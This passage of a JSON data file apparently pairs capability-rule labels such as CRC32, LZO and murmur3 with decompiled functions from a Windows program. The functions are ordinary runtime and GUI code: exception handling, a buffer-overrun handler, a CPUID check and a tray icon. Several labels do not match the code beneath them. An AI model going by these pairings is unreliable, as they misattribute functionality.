            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.004227eb(uint32_t *arg_8h, uint32_t *arg_ch, uint32_t dwExceptionCode, int32_t arg_14h, ulong *arg_18h, \n            ulong *arg_1ch)\n\n{\n    uint32_t *puVar1;\n    ulong *puVar2;\n    uint8_t uVar3;\n    uint32_t uVar4;\n    \n    uVar4 = dwExceptionCode;\n    puVar1 = arg_ch;\n    arg_8h[1] = 0;\n    arg_8h[2] = 0;\n    arg_8h[3] = 0;\n    if ((dwExceptionCode & 0x10) != 0) {\n        arg_8h[1] = arg_8h[1] | 1;\n        dwExceptionCode = 0xc000008f;\n    }\n    if ((uVar4 & 2) != 0) {\n        arg_8h[1] = arg_8h[1] | 2;\n        dwExceptionCode = 0xc0000093;\n    }\n    if ((uVar4 & 1) != 0) {\n        arg_8h[1] = arg_8h[1] | 4;\n        dwExceptionCode = 0xc0000091;\n    }\n    if ((uVar4 & 4) != 0) {\n        arg_8h[1] = arg_8h[1] | 8;\n        dwExceptionCode = 0xc000008e;\n    }\n    if ((uVar4 & 8) != 0) {\n        arg_8h[1] = arg_8h[1] | 0x10;\n        dwExceptionCode = 0xc0000090;\n    }\n    arg_8h[2] = arg_8h[2] ^ (~(*arg_ch << 4) ^ arg_8h[2]) & 0x10;\n    arg_8h[2] = arg_8h[2] ^ (~(*arg_ch << 1) ^ arg_8h[2]) & 8;\n    arg_8h[2] = arg_8h[2] ^ (~(*arg_ch >> 1) ^ arg_8h[2]) & 4;\n    arg_8h[2] = arg_8h[2] ^ (~(*arg_ch >> 3) ^ arg_8h[2]) & 2;\n    arg_8h[2] = arg_8h[2] ^ (~(*arg_ch >> 5) ^ arg_8h[2]) & 1;\n    uVar3 = fcn.00423004();\n    puVar2 = arg_1ch;\n    if ((uVar3 & 1) != 0) {\n        arg_8h[3] = arg_8h[3] | 0x10;\n    }\n    if ((uVar3 & 4) != 0) {\n        arg_8h[3] = arg_8h[3] | 8;\n    }\n    if ((uVar3 & 8) != 0) {\n        arg_8h[3] = arg_8h[3] | 4;\n    }\n    if ((uVar3 & 0x10) != 0) {\n        arg_8h[3] = arg_8h[3] | 2;\n    }\n    if ((uVar3 & 0x20) != 0) {\n        arg_8h[3] = arg_8h[3] | 1;\n    }\n    uVar4 = *puVar1 & 0xc00;\n    if (uVar4 == 0) {\n        *arg_8h = *arg_8h & 0xfffffffc;\n    }\n    else {\n        if (uVar4 == 0x400) {\n            uVar4 = *arg_8h & 0xfffffffd | 1;\n        }\n        else {\n            if (uVar4 != 0x800) {\n                if (uVar4 == 0xc00) {\n                    *arg_8h = *arg_8h | 3;\n                }\n                goto code_r0x00422948;\n            }\n            uVar4 = *arg_8h & 0xfffffffe | 2;\n        }\n        *arg_8h = uVar4;\n    }\ncode_r0x00422948:\n    uVar4 = *puVar1 & 0x300;\n    if (uVar4 == 0) {\n        uVar4 = *arg_8h & 0xffffffeb | 8;\ncode_r0x0042297e:\n        *arg_8h = uVar4;\n    }\n    else {\n        if (uVar4 == 0x200) {\n            uVar4 = *arg_8h & 0xffffffe7 | 4;\n            goto code_r0x0042297e;\n        }\n        if (uVar4 == 0x300) {\n            *arg_8h = *arg_8h & 0xffffffe3;\n        }\n    }\n    *arg_8h = *arg_8h ^ (arg_14h << 5 ^ *arg_8h) & 0x1ffe0;\n    arg_8h[8] = arg_8h[8] | 1;\n    arg_8h[8] = arg_8h[8] & 0xffffffe3 | 2;\n    *(arg_8h + 4) = *arg_18h;\n    arg_8h[0x18] = arg_8h[0x18] | 1;\n    arg_8h[0x18] = arg_8h[0x18] & 0xffffffe3 | 2;\n    *(arg_8h + 0x14) = *arg_1ch;\n    fcn.0042300f();\n    (*_sym.imp.KERNEL32.dll_RaiseException)(dwExceptionCode, 0, 1, &arg_8h);\n    if ((*(arg_8h + 2) & 0x10) != 0) {\n        *puVar1 = *puVar1 & 0xfffffffe;\n    }\n    if ((*(arg_8h + 2) & 8) != 0) {\n        *puVar1 = *puVar1 & 0xfffffffb;\n    }\n    if ((*(arg_8h + 2) & 4) != 0) {\n        *puVar1 = *puVar1 & 0xfffffff7;\n    }\n    if ((*(arg_8h + 2) & 2) != 0) {\n        *puVar1 = *puVar1 & 0xffffffef;\n    }\n    if ((*(arg_8h + 2) & 1) != 0) {\n        *puVar1 = *puVar1 & 0xffffffdf;\n    }\n    uVar4 = *arg_8h & 3;\n    if (uVar4 == 0) {\n        *puVar1 = *puVar1 & 0xfffff3ff;\n    }\n    else {\n        if (uVar4 == 1) {\n            uVar4 = *puVar1 & 0xfffff7ff | 0x400;\n        }\n        else {\n            if (uVar4 != 2) {\n                if (uVar4 == 3) {\n                    *(puVar1 + 1) = *(puVar1 + 1) | 0xc;\n                }\n                goto code_r0x00422a57;\n            }\n            uVar4 = *puVar1 & 0xfffffbff | 0x800;\n        }\n        *puVar1 = uVar4;\n    }\ncode_r0x00422a57:\n    uVar4 = *arg_8h >> 2 & 7;\n    if (uVar4 == 0) {\n        uVar4 = *puVar1 & 0xfffff3ff | 0x300;\n    }\n    else {\n        if (uVar4 != 1) {\n            if (uVar4 == 2) {\n                *puVar1 = *puVar1 & 0xfffff3ff;\n            }\n            goto code_r0x00422a86;\n        }\n        uVar4 = *puVar1 & 0xfffff3ff | 0x200;\n    }\n    *puVar1 = uVar4;\ncode_r0x00422a86:\n    *puVar2 = *(arg_8h + 0x14);\n    return;\n}\n",
        "token_count": 1901
    },
    "0040d7d0": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n\nuint32_t fcn.0040d7d0(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint var_8h;\n    uint var_18h;\n    uchar auStack256 [208];\n    uint uStack48;\n    uint var_28h;\n    uint var_1ch;\n    uint var_18h_2;\n    uint var_10h;\n    code *pcStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x43dff0;\n    pcStack16 = fcn.00418a70;\n    var_10h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0040d7d0::var_10h;\n    var_4h = 0;\n    uStack48 = 0x40d80f;\n    fcn.00418b80();\n    *in_FS_OFFSET = var_10h;\n    return &stack0xffffff00 | 1;\n}\n",
        "token_count": 229
    },
    "0040f371": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint32_t fcn.0040f371(uint32_t *param_1)\n\n{\n    int16_t iVar1;\n    int16_t *piVar2;\n    uint32_t uVar3;\n    bool bVar4;\n    \n    uVar3 = *param_1;\n    bVar4 = *(param_1 + 2) == -1;\n    if (bVar4) {\n        uVar3 = param_1[3];\n        piVar2 = param_1 + 0x1a;\n    }\n    else {\n        piVar2 = param_1 + 0x12;\n    }\n    if (*piVar2 == -1) {\n        piVar2 = piVar2 + 2;\n    }\n    else {\n        do {\n            iVar1 = *piVar2;\n            piVar2 = piVar2 + 1;\n        } while (iVar1 != 0);\n    }\n    if (*piVar2 == -1) {\n        piVar2 = piVar2 + 2;\n    }\n    else {\n        do {\n            iVar1 = *piVar2;\n            piVar2 = piVar2 + 1;\n        } while (iVar1 != 0);\n    }\n    do {\n        iVar1 = *piVar2;\n        piVar2 = piVar2 + 1;\n    } while (iVar1 != 0);\n    if ((uVar3 & 0x40) != 0) {\n        piVar2 = piVar2 + bVar4 * 2 + 1;\n        do {\n            iVar1 = *piVar2;\n            piVar2 = piVar2 + 1;\n        } while (iVar1 != 0);\n    }\n    return piVar2 + 3U & 0xfffffffc;\n}\n",
        "token_count": 383
    },
    "00414136": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.00414136(int32_t param_1, uint *param_2)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t unaff_retaddr;\n    \n    uVar2 = fcn.004117a2(&param_2);\n    if (uVar2 == '\\0') {\n        uVar2 = uVar2 & 0xffffff00;\n    }\n    else {\n        iVar3 = unaff_retaddr * 0x30 + *(param_1 + 0x14);\n        uVar1 = *((*(iVar3 + 0x10) + 3 + *(iVar3 + 4) & 0xfffffffcU) + 4 + *(param_1 + 8));\n        *param_2 = uVar1;\n        uVar2 = CONCAT31(uVar1 >> 8, 1);\n    }\n    return uVar2;\n}\n",
        "token_count": 210
    },
    "0041f1fc": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h_2\n\nvoid __cdecl fcn.0041f1fc(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    char *pcVar4;\n    uint var_8h;\n    uint var_ch;\n    uint var_128h_2;\n    uint var_124h_2;\n    uint var_128h;\n    uint lpFilename;\n    uint var_18h_2;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint uStack4;\n    \n    uStack4 = 0x118;\n    var_18h = 0x4422b8;\n    fcn.00419d14();\n    *(unaff_EBP + -0x1c) = *0x44d270;\n    pcVar1 = *0x450b84;\n    if (*0x450b84 == NULL) {\n        if (*(unaff_EBP + 8) == 1) {\n            pcVar4 = \"Buffer overrun detected!\";\n            *(unaff_EBP + -0x128) =\n                 \"A buffer overrun has been detected which has corrupted the program\\'s\\ninternal state.  The program cannot safely continue execution and must\\nnow be terminated.\\n\"\n            ;\n        }\n        else {\n            pcVar4 = \"Unknown security failure detected!\";\n            *(unaff_EBP + -0x128) =\n                 \"A security error of unknown cause has been detected which has\\ncorrupted the program\\'s internal state.  The program cannot safely\\ncontinue execution and must now be terminated.\\n\"\n            ;\n        }\n        *(unaff_EBP + -0x20) = 0;\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, unaff_EBP + -0x124, 0x104);\n        if (iVar2 == 0) {\n            fcn.004200e0(unaff_EBP + -0x124, \"<program name unknown>\");\n        }\n        iVar2 = unaff_EBP + -0x124;\n        iVar3 = fcn.004196b0(iVar2);\n        if (0x3c < iVar3 + 0xbU) {\n            iVar2 = fcn.004196b0(iVar2);\n            iVar2 = iVar2 + unaff_EBP + -0x155;\n            fcn.00421eb0(iVar2, 0x4420d8, 3);\n        }\n        fcn.004196b0(iVar2);\n        fcn.00418b80();\n        *(unaff_EBP + -0x18) = &var_18h;\n        fcn.004200e0(&var_18h, pcVar4);\n        fcn.004200f0(&var_18h, 0x4420b8);\n        fcn.004200f0(&var_18h, \"Program: \");\n        fcn.004200f0(&var_18h, iVar2);\n        fcn.004200f0(&var_18h, 0x4420b8);\n        fcn.004200f0(&var_18h, *(unaff_EBP + -0x128));\n        fcn.00423095(&var_18h, \"Microsoft Visual C++ Runtime Library\", 0x12010);\n    }\n    else {\n        *(unaff_EBP + -4) = 0;\n        (*pcVar1)(*(unaff_EBP + 8), *(unaff_EBP + 0xc));\n        *(unaff_EBP + -4) = 0xffffffff;\n    }\n    fcn.00419a7b(3);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 912
    },
    "0040db70": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040db70(int32_t param_1)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    uint uVar3;\n    uint arg_10h;\n    int32_t iVar4;\n    uint arg_18h;\n    char *arg_1ch;\n    uint arg_20h;\n    uint arg_24h;\n    uint arg_28h;\n    uint arg_2ch;\n    uint arg_30h;\n    \n    uVar2 = (*_sym.imp.KERNEL32.dll_GetVersion)();\n    *(param_1 + 0x50) = 3 < uVar2;\n    if (3 < uVar2 == 0) {\n        return 0;\n    }\n    arg_30h = 10;\n    arg_2ch = 0;\n    arg_28h = 0;\n    arg_24h = 0x80000000;\n    arg_20h = 0x43de73;\n    arg_1ch = NULL;\n    arg_18h = 0;\n    iVar4 = 0;\n    arg_10h = 0;\n    uVar3 = fcn.0042c223(0, 0, 0, 0);\n    fcn.0042dfcd(0, uVar3, arg_10h, iVar4, arg_18h, arg_1ch, arg_20h, arg_24h, arg_28h, arg_2ch, arg_30h);\n    *(param_1 + 0x58) = 0x1e8;\n    if ((iVar4 == 0) || (iVar4 = *(iVar4 + 0x1c),  iVar4 == 0)) {\n        iVar4 = *(param_1 + 0x1c);\n    }\n    *(param_1 + 0x5c) = iVar4;\n    *(param_1 + 0x68) = arg_18h;\n    *(param_1 + 0x60) = arg_24h;\n    *(param_1 + 0x6c) = arg_20h;\n    *(param_1 + 100) = 7;\n    iVar4 = (param_1 + 0x70) - arg_1ch;\n    do {\n        cVar1 = *arg_1ch;\n        arg_1ch[iVar4] = cVar1;\n        arg_1ch = arg_1ch + 1;\n    } while (cVar1 != '\\0');\n    uVar3 = (*_sym.imp.SHELL32.dll_Shell_NotifyIconA)(0, param_1 + 0x58);\n    *(param_1 + 0x50) = uVar3;\n    return uVar3;\n}\n",
        "token_count": 602
    },
    "0041e59f": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0041e5e3)\n// WARNING: Removing unreachable block (ram,0x0041e5d0)\n\nvoid fcn.0041e59f(void)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint32_t uVar4;\n    uint var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    var_4h = *0x44d270;\n    var_1ch = 0;\n    var_18h = 0;\n    var_14h = var_14h & 0xffffff00;\n    uVar4 = (in_NT & 1) * 0x4000 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 | 0x40 | (in_AF & 1) * 0x10 | 4 |\n            (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    uVar2 = uVar4 ^ 0x200000;\n    if ((((uVar2 & 0x4000) != 0) * 0x4000 | ((uVar2 & 0x400) != 0) * 0x400 | ((uVar2 & 0x200) != 0) * 0x200 |\n         ((uVar2 & 0x100) != 0) * 0x100 | ((uVar2 & 0x40) != 0) * 0x40 | ((uVar2 & 0x10) != 0) * 0x10 |\n         ((uVar2 & 4) != 0) * 4 | ((uVar2 & 0x200000) != 0) * 0x200000 | ((uVar2 & 0x40000) != 0) * 0x40000) != uVar4) {\n        iVar3 = cpuid_basic_info(0);\n        var_14h = *(iVar3 + 4);\n        var_10h = *(iVar3 + 8);\n        var_ch = *(iVar3 + 0xc);\n        piVar1 = cpuid_Version_info(1);\n        var_18h = *piVar1;\n        var_1ch = piVar1[2];\n    }\n    *0x450fa4 = 0;\n    *0x450fa0 = 0;\n    if (((var_1ch & 0x4000000) != 0) && (iVar3 = fcn.0041e56a(),  iVar3 != 0)) {\n        *0x450fa4 = 1;\n        iVar3 = fcn.00421640(\"AuthenticAMD\", &var_14h, 0xc);\n        if ((iVar3 != 0) || (uVar2 = var_18h >> 8 & 0xf,  (~-(uVar2 != 0xf) & var_18h >> 0x14 & 0xffU) + uVar2 != 0xf))\n        {\n            *0x450fa0 = 1;\n        }\n    }\n    fcn.004192ca();\n    return;\n}\n",
        "token_count": 851
    },
    "00433666": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid fcn.00433666(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    \n    if (param_1 != 0) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GlobalFlags)(param_1);\n        for (uVar1 = uVar1 & 0xff; uVar1 != 0; uVar1 = uVar1 - 1) {\n            (*_sym.imp.KERNEL32.dll_GlobalUnlock)(param_1);\n        }\n        (*_sym.imp.KERNEL32.dll_GlobalFree)(param_1);\n    }\n    return;\n}\n",
        "token_count": 130
    },
    "00417436": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint32_t fcn.00417436(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = (*_sym.imp.USER32.dll_SendMessageA)(*(param_1 + 0x1c), 0x400, 0, 0);\n    if (uVar1 >> 0x10 == 0x534b) {\n        uVar1 = uVar1 & 0xffff;\n    }\n    else {\n        uVar1 = 1;\n    }\n    return uVar1;\n}\n",
        "token_count": 119
    },
    "00425380": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00425380(char *arg_8h, int32_t arg_ch, uint32_t *arg_10h)\n\n{\n    int16_t iVar1;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    uint var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    puVar2 = arg_10h;\n    var_4h = *0x44d270;\n    iVar1 = 0x404e;\n    *arg_10h = 0;\n    arg_10h[1] = 0;\n    arg_10h[2] = 0;\n    if (arg_ch != 0) {\n        arg_10h = arg_ch;\n        do {\n            var_10h = *puVar2;\n            var_ch = puVar2[1];\n            var_8h = puVar2[2];\n            fcn.00425325(puVar2);\n            fcn.00425325(puVar2);\n            fcn.004252c7(puVar2, &var_10h);\n            fcn.00425325(puVar2);\n            var_10h = *arg_8h;\n            var_ch = 0;\n            var_8h = 0;\n            fcn.004252c7(puVar2, &var_10h);\n            arg_8h = arg_8h + 1;\n            arg_10h = arg_10h + -1;\n        } while (arg_10h != NULL);\n    }\n    if (puVar2[2] == 0) {\n        do {\n            iVar1 = iVar1 + -0x10;\n            uVar3 = puVar2[1] >> 0x10;\n            puVar2[1] = *puVar2 >> 0x10 | puVar2[1] << 0x10;\n            *puVar2 = *puVar2 << 0x10;\n        } while (uVar3 == 0);\n        puVar2[2] = uVar3;\n    }\n    while ((puVar2[2] & 0x8000) == 0) {\n        fcn.00425325(puVar2);\n        iVar1 = iVar1 + -1;\n    }\n    *(puVar2 + 10) = iVar1;\n    fcn.004192ca();\n    return;\n}\n",
        "token_count": 549
    },
    "0042ca29": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nint32_t fcn.0042ca29(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = fcn.00438ea6(0x4371aa);\n    uVar2 = (*_sym.imp.USER32.dll_GetMessageTime)();\n    *(iVar1 + 0x68) = uVar2;\n    uVar2 = (*_sym.imp.USER32.dll_GetMessagePos)();\n    *(iVar1 + 0x70) = uVar2 >> 0x10;\n    *(iVar1 + 0x6c) = uVar2;\n    return iVar1 + 0x58;\n}\n",
        "token_count": 140
    },
    "0042d805": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042d805(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    uint32_t uVar3;\n    uint var_2ch;\n    uint32_t var_28h;\n    int32_t var_4h;\n    \n    uVar3 = arg_8h & 0xffff;\n    arg_8h = arg_8h >> 0x10;\n    if (arg_ch == 0) {\n        if (uVar3 == 0) {\n            return 0;\n        }\n        fcn.0042b7d6();\n        var_28h = uVar3;\n        (**(*in_ECX + 0xc))(uVar3, 0xffffffff, &var_2ch, 0);\n        if (var_4h != 0) {\n            arg_8h = 0;\ncode_r0x0042d849:\n            uVar1 = (**(*in_ECX + 0xc))(uVar3, arg_8h, 0, 0);\n            return uVar1;\n        }\n    }\n    else {\n        iVar2 = fcn.00438ea6(0x4371aa);\n        if ((*(iVar2 + 0xdc) != in_ECX[7]) && (iVar2 = fcn.0042d562(arg_ch, 0),  iVar2 == 0)) {\n            if (uVar3 == 0) {\n                return 0;\n            }\n            goto code_r0x0042d849;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 363
    },
    "0042e711": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498",
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498",
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042e711(uint32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, int32_t *arg_14h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_ch;\n    int32_t *var_8h;\n    int32_t var_4h;\n    \n    if (arg_8h < 0x112) {\n        if (arg_8h == 0x111) {\n            iVar2 = fcn.0042f43f(0, arg_ch >> 0x10 | 0xbd110000, 0, 0);\n            if (iVar2 == 0) {\n                return 0;\n            }\n            if (arg_14h != NULL) {\n                *arg_14h = 1;\n                return 1;\n            }\n            return 1;\n        }\n        if (0x2a < arg_8h) {\n            if ((arg_8h < 0x30) || (arg_8h == 0x39)) goto code_r0x0042e7a5;\n            if (arg_8h == 0x4e) {\n                var_8h = arg_14h;\n                var_4h = arg_10h;\n                uVar1 = fcn.0042f43f(0, *(arg_10h + 8) & 0xffff | 0xbc4e0000, &var_8h, 0);\n                return uVar1;\n            }\n        }\n    }\n    else if ((0x113 < arg_8h) && ((arg_8h < 0x116 || (arg_8h == 0x210)))) {\ncode_r0x0042e7a5:\n        uVar1 = fcn.0042e106(arg_8h + 0xbc00, arg_ch, arg_10h, arg_14h);\n        return uVar1;\n    }\n    if ((0x131 < arg_8h) && (arg_8h < 0x139)) {\n        var_4h = arg_8h - 0x132;\n        var_8h = arg_ch;\n        uVar1 = fcn.0042e106(0xbc19, 0, &var_ch, arg_14h);\n        if (*arg_14h != 0) {\n            return uVar1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 541
    },
    "0043793a": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nvoid fcn.0043793a(void)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    uchar *puVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iStack148;\n    int32_t iStack144;\n    uint8_t *puStack140;\n    uchar auStack136 [128];\n    uint uStack8;\n    \n    uStack8 = *0x44d270;\n    uVar2 = (*_sym.imp.USER32.dll_GetMenuCheckMarkDimensions)();\n    iVar5 = uVar2;\n    iStack148 = uVar2 >> 0x10;\n    if (0x20 < iVar5) {\n        iVar5 = 0x20;\n    }\n    iVar6 = iVar5 + 0xf >> 4;\n    iVar7 = ((iVar5 + -4) / 2 + iVar6 * 0x10) - iVar5;\n    if (0xc < iVar7) {\n        iVar7 = 0xc;\n    }\n    if (0x20 < iStack148) {\n        iStack148 = 0x20;\n    }\n    fcn.004192e0(auStack136, 0xff, 0x80);\n    puVar4 = auStack136 + (iStack148 + -6 >> 1) * iVar6 * 2;\n    puStack140 = 0x43f1d8;\n    iStack144 = 5;\n    do {\n        uVar1 = *puStack140;\n        uVar3 = puStack140 & 0xffff0000;\n        puStack140 = puStack140 + 1;\n        uVar3 = ~((uVar3 | uVar1) << (iVar7 & 0x1f));\n        *puVar4 = uVar3 >> 8;\n        puVar4[1] = uVar3;\n        puVar4 = puVar4 + iVar6 * 2;\n        iStack144 = iStack144 + -1;\n    } while (iStack144 != 0);\n    *0x4504b8 = (*_sym.imp.GDI32.dll_CreateBitmap)(iVar5, iStack148, 1, 1, auStack136);\n    if (*0x4504b8 == 0) {\n        *0x4504b8 = (*_sym.imp.USER32.dll_LoadBitmapA)(0, 0x7fe3);\n    }\n    fcn.004192ca();\n    return;\n}\n",
        "token_count": 555
    },
    "0040fa89": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_94h\n\nvoid __cdecl\nfcn.0040fa89(uint arg_8h, uint hWndInsertAfter, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    ushort uVar1;\n    ushort uVar2;\n    int16_t iVar3;\n    int16_t iVar4;\n    int16_t iVar5;\n    uint uVar6;\n    int32_t *piVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    int32_t unaff_EBP;\n    int32_t *arg_8h_00;\n    int32_t iVar10;\n    uint *puVar11;\n    uint *in_FS_OFFSET;\n    uint var_94h;\n    uint var_6ch;\n    uint lpRect;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ah;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint pbstr;\n    uint var_24h;\n    uint var_20h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00419340();\n    puVar11 = *(unaff_EBP + 0x14);\n    *(unaff_EBP + -0x10) = *0x44d270;\n    *(unaff_EBP + -0x34) = puVar11 + 0x12;\n    if (*(unaff_EBP + 0x10) != 0) {\n        uVar1 = *(puVar11 + 0x12);\n        *(unaff_EBP + -0x58) = puVar11[2];\n        *(unaff_EBP + -0x54) = puVar11[1];\n        *(unaff_EBP + -0x50) = *(puVar11 + 3);\n        *(unaff_EBP + -0x4e) = *(puVar11 + 0xe);\n        uVar2 = *(puVar11 + 4);\n        *(unaff_EBP + -0x4a) = uVar1;\n        uVar1 = *(puVar11 + 5);\n        puVar9 = puVar11 + 6;\n        *(unaff_EBP + -0x4c) = uVar2;\n        *(unaff_EBP + -0x48) = uVar1;\n        puVar11 = unaff_EBP + -0x58;\n        *(unaff_EBP + -0x34) = puVar9;\n    }\n    iVar3 = *(puVar11 + 10);\n    iVar4 = *(puVar11 + 3);\n    iVar5 = *(puVar11 + 2);\n    *(unaff_EBP + -0x5c) = *(puVar11 + 0xe) + iVar3;\n    iVar10 = *(*(unaff_EBP + 8) + 0x1c);\n    *(unaff_EBP + -0x68) = iVar5;\n    *(unaff_EBP + -100) = iVar3;\n    *(unaff_EBP + -0x60) = iVar4 + iVar5;\n    (*_sym.imp.USER32.dll_MapDialogRect)(iVar10, unaff_EBP + -0x68);\n    arg_8h_00 = *(unaff_EBP + 0x1c);\n    *(unaff_EBP + -0x28) = 0;\n    if (3 < *(unaff_EBP + 0x20)) {\n        iVar8 = *arg_8h_00;\n        *(unaff_EBP + 0x20) = *(unaff_EBP + 0x20) + -4;\n        arg_8h_00 = arg_8h_00 + 1;\n        if (iVar8 != 0) {\n            uVar6 = (*_sym.imp.OLEAUT32.dll_SysReAllocStringLen)(arg_8h_00, iVar8);\n            arg_8h_00 = arg_8h_00 + iVar8 * 2;\n            *(unaff_EBP + 0x20) = *(unaff_EBP + 0x20) + iVar8 * -2;\n            *(unaff_EBP + -0x28) = uVar6;\n        }\n    }\n    *(unaff_EBP + -0x2c) = 0;\n    piVar7 = fcn.004308e7();\n    iVar8 = (**(*piVar7 + 0xc))();\n    *(unaff_EBP + 0x14) = iVar8 + 0x10;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x38) = 0;\n    *(unaff_EBP + -0x3c) = 0;\n    *(unaff_EBP + -0x30) = 0;\n    if ((*(unaff_EBP + 0x18) == 0x37a) || (*(unaff_EBP + 0x18) == 0x37b)) {\n        iVar8 = *arg_8h_00;\n        arg_8h_00 = arg_8h_00 + 3;\n        *(unaff_EBP + -0x40) = iVar8;\n        *(unaff_EBP + 0x1c) = iVar8 + -0xc;\n        piVar7 = arg_8h_00;\n        if (iVar8 + -0xc != 0) {\n            do {\n                iVar8 = *piVar7;\n                *(unaff_EBP + 0x1c) = *(unaff_EBP + 0x1c) + -6;\n                uVar1 = *(piVar7 + 1);\n                arg_8h_00 = piVar7 + 6;\n                *(unaff_EBP + -0x44) = iVar8;\n                *(unaff_EBP + 0x10) = uVar1;\n                if (iVar8 == -0x7ffeffff) {\n                    *(unaff_EBP + -0x3c) = *arg_8h_00;\n                    iVar10 = piVar7 + 0x16;\n                    *(unaff_EBP + -0x30) = *(piVar7 + 10);\n                    fcn.00402d10();\n                    iVar8 = *(*(unaff_EBP + 0x14) + -0xc);\n                    *(unaff_EBP + 0x1c) = *(unaff_EBP + 0x1c) + (-0x11 - iVar8);\n                    arg_8h_00 = piVar7 + iVar8 + 0x17;\n                    *(unaff_EBP + -0x38) = *(unaff_EBP + 0x10);\n                }\n                else {\n                    iVar8 = fcn.0042f804(0x1c);\n                    *(unaff_EBP + -0x6c) = iVar8;\n                    *(unaff_EBP + -4) = 1;\n                    if (iVar8 == 0) {\n                        uVar6 = 0;\n                    }\n                    else {\n                        iVar10 = *(unaff_EBP + -0x2c);\n                        uVar6 = fcn.00412abf();\n                    }\n                    *(unaff_EBP + -4) = 0;\n                    *(unaff_EBP + -0x2c) = uVar6;\n                }\n                piVar7 = arg_8h_00;\n            } while (*(unaff_EBP 